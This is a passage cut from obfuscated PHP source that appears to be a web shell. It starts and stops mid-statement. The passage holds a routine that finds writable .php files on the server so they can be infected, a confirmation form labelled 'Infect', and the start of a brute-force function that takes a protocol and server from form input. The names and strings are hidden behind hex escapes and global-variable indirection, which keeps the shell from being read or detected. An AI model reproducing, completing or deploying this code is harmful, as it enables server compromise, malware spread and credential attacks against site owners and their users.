]}))${$pkvcvpi}=array_merge(${${"\x47\x4c\x4fB\x41\x4cS"}["\x65\x6cx\x70h\x78\x71e"]},${${"G\x4c\x4f\x42\x41L\x53"}["w\x73x\x6cs\x73"]});}else{array_push(${${"\x47\x4c\x4fBAL\x53"}["\x65\x6c\x78\x70\x68\x78q\x65"]},${${"\x47\x4c\x4fB\x41\x4c\x53"}["vt\x6e\x6e\x75\x68p"]}."/".${${"\x47\x4cOB\x41\x4c\x53"}["\x62l\x75\x6d\x65\x6d\x67o"]});}}}closedir(${${"\x47\x4c\x4f\x42A\x4cS"}["\x76\x75wcpk\x6c"]});return${${"\x47L\x4fB\x41\x4cS"}["e\x6c\x78p\x68\x78\x71e"]};}}foreach(ListFiles(${${"GL\x4f\x42\x41L\x53"}["\x65djv\x6du"]})as${$jkndlujcsh}=>${${"\x47\x4c\x4fB\x41\x4c\x53"}["b\x6c\x75\x6d\x65\x6d\x67\x6f"]}){${"\x47\x4c\x4f\x42A\x4cS"}["\x73\x71rc\x6bjv\x66\x69e\x62"]="\x66\x69l\x65";$nemyxji="n\x46\x69le";${$nemyxji}=substr(${${"GLOBA\x4c\x53"}["\x73\x71r\x63\x6b\x6a\x76f\x69e\x62"]},-4,4);if(${${"G\x4c\x4f\x42\x41LS"}["dls\x6b\x76\x68\x61\x6c\x72\x6b\x62\x65"]}=="\x2e\x70hp"){$vpsnhjv="\x66\x69\x6c\x65";if((${$vpsnhjv}<>$_SERVER["\x44\x4f\x43U\x4dE\x4e\x54\x5f\x52\x4fO\x54"].$_SERVER["\x50H\x50_\x53ELF"])&&(is_writeable(${${"\x47L\x4fB\x41LS"}["\x62\x6cu\x6d\x65\x6d\x67o"]}))){$oubpucxthh="i";echo"$file\x3cbr>";${$oubpucxthh}++;}}}echo"\x3cfon\x74\x20\x63olor=r\x65d si\x7a\x65\x3d\x314\x3e$i\x3c/f\x6fnt\x3e";}else{echo"\x3cf\x6f\x72m\x20\x6d\x65\x74\x68\x6f\x64=p\x6fst\x3e<\x69n\x70\x75t\x20\x74\x79pe\x3dsub\x6d\x69\x74\x20\x76al\x75e\x3d\x49nf\x65c\x74 na\x6d\x65\x3d\x69\x6ef\x65t></for\x6d\x3e";echo"R\x65al\x6c\x79 \x77a\x6et\x20\x74o inf\x65ct t\x68e\x20ser\x76er?\x26n\x62\x73p;<\x61\x20href=\x23\x20\x6f\x6ec\x6c\x69ck=\"g(\x6e\x75\x6cl,\x6e\x75l\x6c,\x27in\x66\x65\x63\x74')\">Y\x65\x73\x3c/a></d\x69\x76\x3e";}printFooter();}function actionBruteforce(){printHeader();if(isset($_POST["pr\x6f\x74o"])){echo"\x3c\x681\x3e\x52\x65\x73ul\x74s</\x68\x31\x3e<\x64iv\x20\x63l\x61\x73s\x3dco\x6eten\x74\x3e<s\x70\x61n\x3eTyp\x65:</span\x3e\x20".htmlspecialchars($_POST["\x70\x72\x6fto"])." \x3c\x73\x70\x61\x6e\x3e\x53\x65r\x76e\x72:</s\x70\x61\x6e>\x20".htmlspecialchars($_POST[